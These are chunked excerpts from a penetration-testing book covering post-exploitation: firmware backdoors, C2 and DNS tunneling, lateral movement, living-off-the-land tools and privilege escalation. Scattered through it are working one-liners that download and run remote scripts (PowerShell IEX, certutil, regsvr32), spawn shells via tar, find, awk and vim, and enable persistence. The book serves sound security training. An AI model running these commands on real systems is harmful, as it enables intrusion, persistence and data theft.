persist through reboots and operate at a very low level in the system.
Rootkits and bootkits are sophisticated malware that provide attackers with
persistent, low-level access to compromised systems. Rootkits operate at
the kernel level, often modifying core system functions to remain hidden
and maintain control. Bootkits, on the other hand, infect the boot process
itself, ensuring they are loaded before the operating system, making them
highly persistent and difficult to remove.
Hardware and Firmware Backdoors
Hardware and firmware backdoors represent some of the most sneaky and
difficult-to-detect types of cyber threats. These backdoors are implemented
by injecting malicious code into the firmware of hardware components,
allowing attackers to maintain persistent access and control over a system
even if the operating system is reinstalled or the hard drive is replaced.
The basic input/output system (BIOS) and Unified Extensible Firmware
Interface (UEFI) are types of firmware used to initialize hardware during
the boot process before the operating system loads. By injecting malicious
code into these firmware components, attackers can gain control over a
system at its most fundamental level.
Injection of Malicious Code and Persistence
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p273_c247
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 273
# TOKENS: ~318
### CONTENT ###
Attackers gain access to the system firmware, often through vulnerabilities
in the firmware update process or physical access to the machine. Malicious
code is injected into the firmware, modifying its normal operation.
The backdoor code loads before the operating system, ensuring it runs
every time the system is started. This persistence mechanism makes it
extremely difficult to detect and remove because reinstalling the OS does
not affect the firmware. The backdoor can manipulate the boot process to
load additional malware or bypass security mechanisms. By operating
below the OS level, these backdoors can remain hidden from traditional
security tools. Full access to hardware allows attackers to manipulate
system behavior and monitor activities without detection.
Peripheral devices like network cards, hard drives, and other hardware
components also have their own firmware, which can be targeted to create
backdoors. Attackers compromise the firmware of peripheral devices
through vulnerabilities in firmware update mechanisms, supply chain
attacks, or physical access. The malicious firmware is loaded each time the
device is powered on, ensuring persistent access. Even replacing the OS or
hard drive will not remove the compromised firmware.
Use Case: BadUSB
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p274_c248

### CONTENT ###
A proof-of-concept attack demonstrated how USB device firmware could
be reprogrammed to execute malicious activities, such as emulating a
keyboard to execute commands on the host system. Flipper Zero is a
versatile, portable, open-source multi-tool designed for cybersecurity
enthusiasts. It is equipped with various hardware and software capabilities
that allow users to interact with and manipulate a wide range of electronic
devices and systems. Flipper Zero can function as a BadUSB device, being
recognized by computers as a human interface device (HID), like a
keyboard. A BadUSB device can alter system settings, open backdoors,
extract data, initiate reverse shells, or perform any action possible with
physical access. It achieves this effect by executing a series of commands
written in the Rubber Ducky Scripting Language, known as DuckyScript.
These commands are collectively referred to as a payload. You can obtain
more information about Flipper Zero at https://docs.flipper.net.
Scheduled Jobs and Tasks
Windows has a command that attackers can use to schedule automated
execution of tasks on a local or remote computer. You can use this
functionality for post-exploitation and persistence. You can take advantage
of the Windows Task Scheduler to bypass User Account Control (UAC) if
the user has access to its graphical interface. This is possible because the
security option runs with the system's highest privileges. When a Windows
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p275_c249

user creates a new task, the system typically doesn't require the user to

Note
You can access the scheduled tasks of a Windows system by
navigating to Start > Administrative Tools > Task
Scheduler. Alternatively, you can press Windows key+R to
open the Run dialog box, type taskschd.msc, and then press
Enter.
Scheduled tasks can also be used to steal data over time without raising
alarms. In Windows, Task Scheduler can be leveraged to schedule jobs that
may use a significant amount of CPU resources and network bandwidth.
This capability is helpful when huge files are to be compressed and
transferred over a network (especially if you set them to execute at night or
during weekends, when no users will be on the victim's system).
Much as with scheduled tasks, as you previously learned, you can create
your own custom daemons (services) and processes on a victim system, as
well as additional backdoors. Whenever possible, a backdoor must survive
reboots to maintain persistence on the victim's system. You can ensure this
by creating daemons that are automatically started at bootup. These
daemons can persist on the system to either further compromise other
systems (lateral movement) or exfiltrate data.
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p276_c250

### CONTENT ###
New Users
After you compromise a system, if you obtain administrator (root) access to
the system, you can create additional accounts. These accounts can be used
to connect to and interact with the victim system. Just as it is a best practice
when configuring user accounts under normal circumstances, you (as an
attacker) should create those alternate accounts with complex passwords.
Command and Control (C2) and Covert Channels
Command and Control (C2) refers to the infrastructure and protocols that
attackers use to communicate with and control compromised systems within
a target network. Effective C2 channels allow attackers to send commands,
receive data, and maintain persistent control over their malicious
operations. C2 channels must be stealthy to avoid detection by security
defenses and monitoring systems.
Covert channels are methods of communication that conceal the existence
of the transmission. Attackers use covert channels to hide their C2 traffic
from detection mechanisms. A few common covert channels used in C2
communications include
• DNS Tunneling
• HTTP/HTTPS Tunneling
• Using Nontraditional Protocols
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p277_c251
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 277
# TOKENS: ~369
### CONTENT ###
DNS tunneling involves encapsulating data within DNS queries and
responses. Since DNS traffic is often allowed through firewalls and
monitoring systems, it can be a stealthy way to transmit data between the
attacker and the compromised system.
Attackers have increasingly leveraged legitimate services like Dropbox,
Google Drive, and even X (previously known as Twitter) as C2 channels to
evade detection by security systems. These platforms are trusted by
organizations and often allowed through firewalls, making them ideal for
blending malicious traffic with legitimate network activity.
Dropbox, a popular cloud storage service, has been abused by malware
operators to establish covert C2 channels. Attackers use Dropbox's API to
upload and download encrypted files that contain commands or exfiltrated
data. You can create a Dropbox account and configure malware on the
victim’s machine to communicate with this account via the Dropbox API.
The malware uploads files containing system information or exfiltrated data
and checks the Dropbox folder for new commands. Since Dropbox is
widely used in corporate environments, traffic to Dropbox servers may not
raise alarms, making it harder for defenders to differentiate between
legitimate and malicious traffic.
X has also been exploited for C2 operations by embedding commands in
tweets. Attackers use the platform’s public nature to send instructions to
malware without needing direct communication with the infected system.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p278_c252

# TOKENS: ~304
### CONTENT ###
You can create an X account and posts tweets containing encoded or
encrypted commands. The malware on the victim’s machine regularly
checks the attacker’s X feed for new instructions, decodes them, and
executes the commands.
Google Drive and Google Sheets have also been used to hide C2
communications within legitimate-looking cloud activity. Attackers can use
Google Drive’s API to upload command files or exfiltrate data from
compromised systems. In other cases, they use Google Sheets’ API to
embed commands in spreadsheet cells, which the malware retrieves and
executes. Attackers have also employed other cloud-based services like
OneDrive, Slack, and Telegram for similar purposes.
How DNS Tunneling Works
The malware on a compromised system encodes data into DNS queries.
These queries are sent to a DNS domain controlled by an attacker. The
attacker's DNS server receives the queries, decodes the data, and processes
the commands or data. The attacker's server encodes responses into DNS
answers, which are then sent back to the compromised system.
For example, a compromised system sends a DNS query like
payload.h4cker.org. The attacker’s DNS server decodes the payload part to
extract the data or command.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p279_c253
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 279
# TOKENS: ~350
### CONTENT ###
DNS is typically trusted and allowed through firewalls, making it an
attractive channel for malicious communication.
Now, let’s go over a more detailed breakdown of how DNS tunneling
works. In the initial setup, you register a domain (such as h4cker.org) and
configure the authoritative name server for this domain to point to a server
they control. This server runs software capable of handling DNS tunneling.
You then compromise a target system. Your payload is programmed to
communicate with the DNS server using DNS queries.
Once the malware is installed on the compromised system, it begins
sending data or commands to your server via DNS queries. The malware
encodes data (such as system information, commands, or exfiltrated files)
into the subdomain part of a DNS query. For example, if the malware wants
to send the string “payload”, it might encode this string into a query like
“payload.h4cker.org”.
The compromised system sends this query to its local DNS resolver (a
legitimate DNS server). Since DNS traffic is generally allowed through
firewalls, this query passes through without raising alarms.
The local DNS resolver forwards the query through the normal DNS
resolution process. It queries root servers, top-level domain (TLD) servers
(such as “.org”), and eventually reaches the authoritative name server for
“h4cker.org”, which is controlled by you (the attacker). The authoritative
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p280_c254
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 280
# TOKENS: ~268
### CONTENT ###
DNS server receives the encoded query (“payload.h4cker.org”). The server
decodes the subdomain part (“payload”) to extract the data or command
sent by the malware.
After processing the data or command, the attacker’s server sends a
response back to the compromised system using standard DNS responses:
• Encoding Response: The attacker encodes their response (e.g., an
acknowledgment or further instructions) into a DNS answer.
• Returning Response: This response travels back through the same
recursive resolution path, ultimately reaching the compromised system.
The compromised system receives this response and decodes it to execute
further actions or send more data.
Exfiltration over DNS in Practice
Suppose you want to exfiltrate sensitive data from a compromised system:
1. The malware on the compromised system encodes part of a file into a
subdomain like “filepart1.h4cker.org”.
2. This query is sent to a legitimate DNS resolver, which forwards it to the
authoritative name server for “h4cker.org”.
3. Your server decodes “filepart1” from the query and stores it.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p281_c255

# PAGE: 281
# TOKENS: ~220
### CONTENT ###
4. Your server then sends back an acknowledgment in a standard DNS
response.
5. The process repeats until all parts of the file are exfiltrated.
Tip
Tools like dns2tcp (https://github.com/alex-sector/dns2tcp)
and iodine (https://github.com/yarrick/iodine) can be used
for DNS tunneling.
HTTP/HTTPS Tunneling
HTTP/HTTPS tunneling disguises C2 traffic as normal web traffic. Since
web traffic is generally allowed and encrypted (in the case of HTTPS), this
method provides a reliable and stealthy way for attackers to communicate
with compromised systems.
The malware on the compromised system packages C2 commands and data
into HTTP or HTTPS requests. The attacker's web server receives the
requests, extracts the commands or data, and processes them. The server
then sends back responses embedded in HTTP/HTTPS responses, which are
processed by the malware on the compromised system.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p282_c256

# PAGE: 282
# TOKENS: ~281
### CONTENT ###
For example, the malware makes HTTP POST requests to
https://h4cker.org/c2, sending encoded commands. The attacker’s server
then responds with encoded data in the HTTP response body.
Nontraditional Protocols
Attackers can use nontraditional or lesser-known protocols to create covert
channels. These protocols are often overlooked by standard security
monitoring tools, making them effective for stealthy C2 communications.
The following are examples of nontraditional protocols used by attackers:
• ICMP (Internet Control Message Protocol) Tunneling: Encapsulates
C2 data within ICMP packets (commonly used for ping requests and
replies). Many firewalls allow ICMP traffic, making it a useful covert
channel.
• VoIP (Voice over IP) Protocols: Uses protocols like Session Initiation
Protocol (SIP) or Real-Time Transport Protocol (RTP) to encapsulate C2
data within VoIP traffic.
• Bluetooth or Other Wireless Protocols: Uses wireless communication
methods to transmit C2 data, often to nearby attacker-controlled devices.
For example, malware on a compromised IoT device sends C2 data to a
nearby attacker’s Bluetooth device.
### END CHUNK ###

Earlier you learned that attackers often use virtual machines in a cloud

The C2 communication can be as simple as maintaining a timed beacon, or
“heartbeat,” to launch additional attacks or for data exfiltration. Figure 6-8

A large number of open-source C2 and adversarial emulation tools are listed
in the C2 Matrix, along with supported features, implant support, and other
information, at https://howto.thec2matrix.com. The C2 Matrix is a
framework used by penetration testers, red teamers, and adversaries to
control compromised systems. It serves as a valuable resource for
cybersecurity professionals to understand, evaluate, and choose the right C2
framework for their needs. The C2 Matrix is designed to provide detailed
information about each C2 framework's features, capabilities, and use cases,
enabling users to make informed decisions.
The C2 Matrix allows you to compare different C2 frameworks based on
various criteria, such as features, operating system compatibility, network
protocols, and more. It serves as an educational tool for understanding the
capabilities and functionalities of various C2 frameworks, which is crucial
for both defensive and offensive security practices.
The C2 Matrix helps penetration testers and red teamers select the most
suitable C2 framework for their engagements, ensuring they have the
necessary tools to effectively simulate adversarial behavior. It includes a
wide range of C2 frameworks, from widely used open-source tools to
advanced commercial solutions. It also has a detailed breakdown of each
framework's features, such as supported operating systems, communication
protocols, encryption methods, and more. The matrix has links to official
### END CHUNK ###

How to Perform Lateral Movement
Lateral movement (also referred to as pivoting) is a post-exploitation
technique that can be performed using many different methods. The main
goal of lateral movement is to move from one device to another to avoid
detection, steal sensitive data, and maintain access to the devices to
exfiltrate the sensitive data, which is data whose theft would have a severe
impact to an organization. Such data typically should not be broadly shared
internally or externally. Access to sensitive data should be limited and
tightly controlled. Data exfiltration is the act of deliberately moving
sensitive data from inside an organization to outside an organization's
perimeter without permission. In the following sections, you will learn the
most common techniques for lateral movement.
Tip
Pass-the-hash is an example of a post-exploitation technique
that can be used to move laterally and compromise other
systems in the network. Because password hashes cannot be
reversed, instead of trying to figure out what the user's
password is, an attacker can just use a password hash
### END CHUNK ###

hash to log in to another client or server system.
Post-Exploitation Scanning
Lateral movement involves scanning a network for other systems,
exploiting vulnerabilities in other systems, compromising credentials, and
collecting sensitive information for exfiltration. Lateral movement is
possible if an organization does not segment its network properly. Network
segmentation is therefore very important.
Note
Testing the effectiveness of your network segmentation
strategy is very important. Your organization might have
deployed virtual or physical firewalls, virtual local area
networks (VLANs), or access control policies for
segmentation, or it might use microsegmentation in
virtualized and containerized environments. You should
perform network segmentation testing often to verify that
your segmentation strategy is appropriate to protect your
network against lateral movement and other post-
exploitation attacks.
### END CHUNK ###

Tip
An attacker needs to avoid raising alarms at this stage. If
security defenders detect that there is a threat on the
network, they will thoroughly sweep through it and thwart
any progress that you have made. In some pen testing cases,
you might start very stealthily and gradually increase the
amount of traffic and automated tools used in order to also
test the effectiveness of the security defenders (including the
security operations center [SOC]).
You can scan for SMB shares that you may be able to log in to with
compromised credentials or that the logged-in user of the compromised
system may have access to. You also can move files to or from other
systems. Alternatively, you can instantiate an SMB share (via Samba or
similar mechanisms) and copy files from a compromised system.

• Microsoft's Remote Desktop Protocol (RDP)

• Other remote monitoring and management (RMM) tools
In addition to traditional remote access protocols, attackers are increasingly
abusing RMM tools. These tools are designed for legitimate IT
administration but have become popular among threat actors due to their
features and ability to evade detection. Some of the most commonly used
RMM tools include AnyDesk, Atera, Splashtop, ConnectWise
ScreenConnect, and TeamViewer. These tools allow administrators to
perform tasks like software deployment, system updates, and
troubleshooting without being physically present at the machine; however,
these same capabilities make them attractive targets for cybercriminals.
Example 6-21 shows an example of using Metasploit to create an RDP
connection. This Metasploit module enables RDP and provides options to
create an account and configure it to be a member of the Local
Administrators and Remote Desktop Users group. This module can also be
used to forward the target's TCP port 3389.

Remote Desktop's main advantage over other tools, like Sysinternals, is that
it gives you a full, interactive graphical user interface (GUI) of the remote
compromised computer. From the remote connection, it is possible to steal
data or collect screenshots, disable security software, or install malware.
Remote Desktop connections are fully encrypted, and monitoring systems
cannot see what you are doing in the remote system. The main disadvantage
of Remote Desktop is that a user working on the compromised remote
system may be able to detect that you are logged on to the system. A
common practice is to use Remote Desktop when no users are on the
compromised system or when compromising a server.

Legitimate Utilities and Living-off the Land
Many different legitimate Windows utilities, such as PowerShell, Windows
Management Instrumentation (WMI), and Sysinternals, can be used for
post-exploitation activities, as described in the following sections.
Similarly, you can use legitimate tools and installed applications in Linux
and macOS systems to perform post-exploitation activities. If a
compromised system has Python installed, for example, you can use it for
additional exploitation and exfiltration. Similarly, you can use the bash shell
and tools like Netcat post-exploitation.
Using legitimate tools to perform post-exploitation activities is often
referred to as living off the land and, in some cases, as fileless malware. The
term fileless malware refers to the idea that there is no need to install any
additional software or binaries to the compromised system. The following
sections discuss several examples of living-off-the-land post-exploitation
techniques.
PowerShell for Post-Exploitation Tasks
You can use PowerShell to get directory listings, copy and move files, get a
list of running processes, and perform administrative tasks. Table 6-4 lists
and describes some of the most useful PowerShell commands that can be
used for post-exploitation tasks.
Table 6-4 Useful PowerShell Commands for Post-Exploitation Tasks

The following PowerShell command can be used to avoid detection by
security products and antivirus software:
PS > IEX (New-Object Net.WebClient).DownloadString('h
/Invoke-PowerShellTcp.ps1')
This command directly loads a PS1 file from the Internet instead of
downloading it and then executes it on the device.
Remote management in Windows via PowerShell (often called PowerShell
[PS] remoting) is a basic feature that a system administrator can use to
access and manage a system remotely. An attacker could also take
advantage of this feature to perform post-exploitation activities.

When you use PowerSploit, you typically expose the scripts launching a
web service. Example 6-22 shows WebSploit Labs running Kali Linux
being used with PowerSploit scripts that are located in /usr/share/windows-
resources/powersploit. A simple web service is started using the command
sudo python3 -m http.server 1337 (where 1337 is the port number). The
compromised system then connects to the attacker's machine (WebSploit
Labs) on port 1337 and downloads a PowerSploit script for data
exfiltration.
Example 6-22 Starting a Web Service to Expose the PowerShell Scripts to
Compromised Hosts
$ cd /usr/share/windows-resources/powersploit
$ sudo python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:133
192.168.88.71 - "GET /Exfiltration/Exfiltration.psdl 
Another PowerShell-based post-exploitation framework is Empire, which is
an open-source framework that includes a PowerShell Windows agent and a
Python Linux agent. Empire implements the ability to run PowerShell
agents without the need for powershell.exe. It allows you to rapidly deploy
post-exploitation modules including keyloggers, bind shells, reverse shells,
Mimikatz, and adaptable communications to evade detection. You can
download Empire from https://github.com/BC-SECURITY/Empire.
### END CHUNK ###

BloodHound
You can use a single-page JavaScript web application called BloodHound
that uses graph theory to reveal the hidden relationships in a Windows
Active Directory environment. An attacker can use BloodHound to identify
numerous attack paths. Similarly, incident response teams can use
BloodHound to detect and eliminate those same attack paths. You can
download BloodHound from the following GitHub repository:
https://github.com/SpecterOps/BloodHound.
Note
You can also use BloodHound to find complex attack paths
in Microsoft Azure.
### END CHUNK ###

Windows Management Instrumentation for Post-Exploitation Tasks
Windows Management Instrumentation (WMI) is used to manage data and
operations on Windows operating systems. You can write WMI scripts or
applications to automate administrative tasks on remote computers. WMI
also provides functionality for data management to other parts of the
operating system, including the System Center Operations Manager
(formerly Microsoft Operations Manager [MOM]) and Windows Remote
Management (WinRM). Malware can use WMI to perform different
activities in a compromised system. For example, the Nyeta ransomware
used WMI to perform administrative tasks.
Note
WMI can also be used to perform many data-gathering
operations. Pen testers therefore use WMI as a quick system-
enumerating tool.
Sysinternals and PsExec
Sysinternals is a suite of tools that allows administrators to control
Windows-based computers from a remote terminal. You can use
Sysinternals to upload, execute, and interact with executables on
compromised hosts. The entire suite works from a command-line interface
and can be scripted. By using Sysinternals, you can run commands that can
### END CHUNK ###

reveal information about running processes, and you can kill or stop
services. Penetration testers commonly use the following Sysinternals tools
post-exploitation:
• PsExec: Executes processes
• PsFile: Shows open files
• PsGetSid: Displays security identifiers of users
• PsInfo: Gives detailed information about a computer
• PsKill: Kills processes
• PsList: Lists information about processes
• PsLoggedOn: Lists logged-in accounts
• PsLogList: Pulls event logs
• PsPassword: Changes passwords
• PsPing: Starts ping requests
• PsService: Makes changes to Windows services
• PsShutdown: Shuts down a computer

# TOKENS: ~265
### CONTENT ###
• PsSuspend: Suspends processes
PsExec is one of the most powerful Sysinternals tools. You can use it to
remotely execute anything that can run on a Windows command prompt.
You can also use PsExec to modify Windows registry values, execute
scripts, and connect a compromised system to another system. For
attackers, one advantage of PsExec is that the output of the commands you
execute is shown on your system (the local system) instead of on the
victim's system. Consequently, an attacker can remain undetected by remote
users.
Tip
The PsExec tool can also copy programs directly to the
victim system and remove those programs after the
connection ceases.
Because of the -i option, the following PsExec command interacts with the
compromised system to launch the calculator application, and the -d option
returns control to the attacker before the launching of calc.exe is completed:
>PsExec \\VICTIM -d -i calc.exe
You can also use PsExec to edit registry values, which means applications
can run with system privileges and have access to data that is normally
### END CHUNK ###

Windows Remote Management (WinRM) for Post-Exploitation Tasks
Windows Remote Management (WinRM) gives you a legitimate way to
connect to Windows systems. WinRM is typically managed by Windows
Group Policy (which is typically used for managing corporate Windows
environments).
WinRM can be useful for post-exploitation activities. An attacker could
enable WinRM to allow further connections to the compromised systems
and maintain persistent access. You can easily enable WinRM on a
Windows system by using the following command:
>Enable-PSRemoting -SkipNetworkProfileCheck -Force
This command configures the WinRM service to automatically start and
sets up a firewall rule to allow inbound connections to the compromised
system.
Living-Off-the-Land Bins, Libraries, and Useful Scripts
GTFOBins is a carefully compiled list of UNIX binaries that can be
leveraged to bypass local security restrictions on misconfigured systems.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p313_c278
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 313
# TOKENS: ~207
### CONTENT ###
You can find it at https://gtfobins.github.io.
The project gathers legitimate Linux/UNIX binaries that can be exploited to
escape restricted shells, escalate or maintain elevated privileges, transfer
files, spawn bind and reverse shells, and perform other post-exploitation
tasks.
Note
GTFOBins isn't a collection of exploits, and the listed
programs themselves aren't inherently vulnerable. Instead,
GTFOBins serves as a resource on how to use available
binaries to achieve various objectives when only certain
tools are accessible.
Let’s look at a few examples. For instance, Tar is a utility for archiving
files. However, it can be used to read or write arbitrary files and gain shell
access:
tar -cf /dev/null /dev/null --checkpoint=1
--checkpoint-action=exec=/bin/sh
This command executes /bin/sh during the archiving process.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p314_c279
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 314
# TOKENS: ~206
### CONTENT ###
Find is a command-line utility for searching files in a directory hierarchy. It
can be used to execute commands:
find / -exec /bin/sh \; -quit
This command executes /bin/sh using the -exec option of find.
Awk is a scripting language used for manipulating data and generating
reports. It also can be used to execute commands:
awk 'BEGIN {system("/bin/sh")}'
This command spawns a shell using awk.
Vi and Vim are text editors. Even Vi and Vim can be used to escape to a
shell:
vim -c ':!sh'
This command opens a shell from within Vim. As you can see, GTFOBins
provides a valuable resource for understanding how legitimate UNIX
binaries can be exploited in a misconfigured system.
LOLBAS stands for Living-Off-the-Land Binaries, Scripts, and Libraries. It
is a project that documents and catalogs legitimate binaries, scripts, and
### END CHUNK ###

<base64-encoded-command>
CertUtil is command-line utility in Windows for managing certificates. It
can be used to download files from the Internet, which can include
malicious payloads:
certutil.exe -urlcache -split -f https://h4cker.org/m
malware.exe
Mshta is a utility that executes Microsoft HTML Applications (HTA). It can
be used to execute scripts embedded in HTML files, often used to download
and execute malicious payloads.

Regsvr32 is a command-line utility for registering and unregistering OLE

DLLs remotely, bypassing allow list mechanisms:
regsvr32.exe /s /n /u /i:http://example.com/malicious
There are dozens of other examples at the LOLBAS website.
Post-Exploitation Privilege Escalation
Privilege escalation is the act of gaining access to resources that normally
would be protected from an application or a user. The result is that a user
can gain additional privileges beyond those that were originally intended by
the developer of the application.
There are two general types of privilege escalation:
• Vertical Privilege Escalation: With vertical privilege escalation, as
illustrated in Figure 6-11, a lower-privileged user accesses functions
reserved for higher-privileged users (such as root or administrator access).
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p317_c282
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 317
# TOKENS: ~121
### CONTENT ###
Figure 6-11 Vertical Privilege Escalation
• Horizontal Privilege Escalation: With horizontal privilege escalation, as
illustrated in Figure 6-12, a regular user accesses functions or content
reserved for other non-root or non-admin users. For instance, say that after
exploiting a system, you are able to get shell access as the user omar.
However, that user does not have permissions to read some files on the
system. You then find that another user, hannah, has access to those files.
### END CHUNK ###

### BEGIN CHUNK ###

You then find a way to escalate your privileges as the user hannah to access
those files.
Figure 6-12 Horizontal Privilege Escalation
Let’s go over a few specific techniques to achieve privilege escalation.
You can search for credentials stored on compromised systems. These
credentials can be found in password caches (such as browser-stored
passwords), configuration files, or memory dumps. Tools like Mimikatz are
commonly used to extract plaintext passwords, hashes, and Kerberos tickets
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p319_c284

# TOKENS: ~356
### CONTENT ###
from memory. Once obtained, these credentials can be used for further
attacks such as pass-the-hash or replay attacks.
Kernel exploits can be used to target the core of the operating system (the
kernel) to bypass security controls and escalate privileges. These exploits
allow attackers to execute arbitrary code with elevated permissions. For
example, exploiting a kernel vulnerability could allow an attacker to gain
root access on a Linux system.
Attackers frequently take advantage of misconfigured systems that grant
excessive permissions. They could include improperly set file permissions,
weak authentication mechanisms, or services running with unnecessarily
high privileges. In Chapter 7, “Active Directory and Linux Environments,”
you will learn more about how you can take advantage of different
vulnerabilities to perform privilege escalation and other attacks in Windows
and Linux systems.
How to Cover Your Tracks
After compromising a system during a penetration testing engagement, you
should always cover your tracks to avoid detection by suppressing logs
(when possible), deleting user accounts that could have been created on the
system, and deleting any files that were created. In addition, after a
penetration testing engagement is complete, you should clean up all
systems. As a best practice, you should discuss these tasks and document
them in the rules of engagement document during the pre-engagement
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p320_c285
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 320
# TOKENS: ~294
### CONTENT ###
phase. The following are a few best practices to keep in mind during the
cleanup process:
• Delete all user accounts used during the test.
• Delete all files, executable binaries, scripts, and temporary files from
compromised systems. A secure deletion method may be preferred. NIST
Special Publication 800-88, Revision 1: "Guidelines for Media
Sanitization," provides guidance for media sanitation. This methodology
should be discussed with your client and the owner of the affected systems.
• Return any modified systems and their configuration to their original
values and parameters.
• Remove all backdoors, daemons, services, and rootkits installed.
• Remove all customer data from your systems, including attacking systems
and any other support systems. Typically, you should do this after creating
and delivering the penetration testing report to the client.
Steganography
Attackers can use steganography for obfuscation, evasion, and to cover
their tracks. Steganography involves hiding a message or any other content
inside an image or a video file. To accomplish this task, you can use tools
such as steghide. You can easily install this tool in a Debian-based Linux

Test Your Skills
Multiple-Choice Questions
1. What is the primary purpose of post-exploitation activities?

Chapter 8. The Future of Red Teaming Beyond
the AI Revolution
Chapter Objectives
After reading this chapter and completing the exercises, you will be able to
do the following:
• Understand the current state of AI in red teaming
• Use AI-powered offensive tools and techniques
• Understand AI-enhanced defensive strategies
• Use fine-tuned uncensored AI models
• Use retrieval-augmented generation (RAG) for red teaming
• Perform assessments of AI and autonomous systems
• Understand how to keep pace with rapidly evolving technologies
The world of red teaming is undergoing a profound transformation, driven
by the advance of AI and other emerging technologies. In recent years we
have experienced the cusp of a new era in cybersecurity and threat
assessment. The interplay between AI-powered offensive tools and
defensive tactics is reshaping the very nature of red team operations. This

The horizon of red teaming is expanding to include challenges introduced
by biohacking, advanced robotics, and human-robot interactions. We need
to continue reimagining red team methodologies, with hybrid human-AI

practices but also in understanding and leveraging AI, as well as attacking
AI. This expanded skill set reflects the growing scope of red teaming, which
now extends into diverse sectors and global challenges. In this chapter, we
